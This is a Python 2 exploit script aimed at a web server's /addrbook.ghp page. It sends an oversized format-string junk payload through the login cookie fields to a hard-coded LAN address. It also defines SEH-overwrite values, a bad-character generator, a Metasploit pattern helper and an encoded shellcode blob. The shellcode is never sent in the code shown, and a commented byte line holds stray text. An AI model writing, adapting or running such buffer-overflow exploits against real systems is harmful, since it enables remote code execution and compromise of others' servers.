#!/usr/bin/env python

import struct
import socket
import sys
import time
from subprocess import Popen, PIPE
from binascii import unhexlify
'''
'''

def gen_pattern(num):
	o = Popen("/opt/metasploit/apps/pro/msf3/tools/pattern_create.rb %s"%num,shell=True,stdout=PIPE,stderr=PIPE)
	return o.stdout.read()

def p32(addr):
	return struct.pack("<I",addr)

def gen_charset(bad=[]):
	b =""
	for i in range(1,256):
		r = "{0:#0{1}x}".format(i,4)
		if r not in bad:
			b += "%02x" % int(r,16)

	return unhexlify(b)


def send_request(host,port,payload):
	# print payload
	print "[+] Sending Payload %s" %(payload[:1024])
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(payload)
	# print s.recv(1024)
	s.close()


junk = "%s"* 2048 
nseh = "\x74\x06\x41\x41"
seh = p32(0x10010101)

# chr_set = (
# "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
# "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
# "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
# "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3c\x3d\x3e\x3f"
# "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
# "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
# "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
# "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
# "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
# "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
# "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
# "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
# "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
# "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"/addrbook.ghp
# "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
# "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
# )

shellcode = (
"\x42\x27\x1c\xf5\xdb\xda\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x4f"
"\xb8\x30\x67\x4a\xf8\x31\x43\x19\x83\xc3\x04\x03\x43\x15\xd2"
"\x92\xb6\x10\x9b\x5d\x47\xe1\xfb\xd4\xa2\xd0\x29\x82\xa7\x41"
"\xfd\xc0\xea\x69\x76\x84\x1e\xf9\xfa\x01\x10\x4a\xb0\x77\x1f"
"\x4b\x75\xb8\xf3\x8f\x14\x44\x0e\xdc\xf6\x75\xc1\x11\xf7\xb2"
"\x3c\xd9\xa5\x6b\x4a\x48\x59\x1f\x0e\x51\x58\xcf\x04\xe9\x22"
"\x6a\xda\x9e\x98\x75\x0b\x0e\x97\x3e\xb3\x24\xff\x9e\xc2\xe9"
"\x1c\xe2\x8d\x86\xd6\x90\x0f\x4f\x27\x58\x3e\xaf\xeb\x67\x8e"
"\x22\xf2\xa0\x29\xdd\x81\xda\x49\x60\x91\x18\x33\xbe\x14\xbd"
"\x93\x35\x8e\x65\x25\x99\x48\xed\x29\x56\x1f\xa9\x2d\x69\xcc"
"\xc1\x4a\xe2\xf3\x05\xdb\xb0\xd7\x81\x87\x63\x76\x93\x6d\xc5"
"\x87\xc3\xca\xba\x2d\x8f\xf9\xaf\x57\xd2\x95\x1c\x65\xed\x65"
"\x0b\xfe\x9e\x57\x94\x54\x09\xd4\x5d\x72\xce\x1b\x74\xc2\x40"
"\xe2\x77\x32\x48\x21\x23\x62\xe2\x80\x4c\xe9\xf2\x2d\x99\xbd"
"\xa2\x81\x72\x7d\x13\x62\x23\x15\x79\x6d\x1c\x05\x82\xa7\x2b"
"\x02\x15\x88\x84\x8c\x8e\x60\xd7\x8c\x4f\xca\x5e\x6a\x25\x3c"
"\x37\x25\xd2\xa5\x12\xbd\x43\x29\x89\x55\xe7\xb8\x56\xa5\x6e"
"\xa1\xc0\xf2\x27\x17\x19\x96\xd5\x0e\xb3\x84\x27\xd6\xfc\x0c"
"\xfc\x2b\x02\x8d\x71\x17\x20\x9d\x4f\x98\x6c\xc9\x1f\xcf\x3a"
"\xa7\xd9\xb9\x8c\x11\xb0\x16\x47\xf5\x45\x55\x58\x83\x49\xb0"
"\x2e\x6b\xfb\x6d\x77\x94\x34\xfa\x7f\xed\x28\x9a\x80\x24\xe9"
"\xaa\xca\x64\x58\x23\x93\xfd\xd8\x2e\x24\x28\x1e\x57\xa7\xd8"
"\xdf\xac\xb7\xa9\xda\xe9\x7f\x42\x97\x62\xea\x64\x04\x82\x3f"
)


payload  =  junk  

print "[+] Length of payload = %d\n" % len(payload)


request = ""
request += "POST /addrbook.ghp HTTP/1.1\r\n"
request += "Host: 192.168.0.105\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip, deflate\r\n"
request += "Referer: http://192.168.0.105/login.htm\r\n"
request += "Connection: keep-alive\r\n"
request += "Cookie: Cookie: SESSIONID=19357; UserID=%s; PassWD=%s; frmUserName=admin; frmUserPass=pass; rememberPass=202%%2C197%%2C208%%2C215%%2C201\r\n" %(payload,payload)
request += "Content-Type: application/x-www-form-urlencoded\r\n"
request += "Content-Length: 64\r\n"
request += "\r\n"
request += "frmLogin=true&frmUserName=tsdfg&frmUserPass=sdgfs&login=Login%21"


host = "192.168.0.105"
port = 80

send_request(host,port,request)
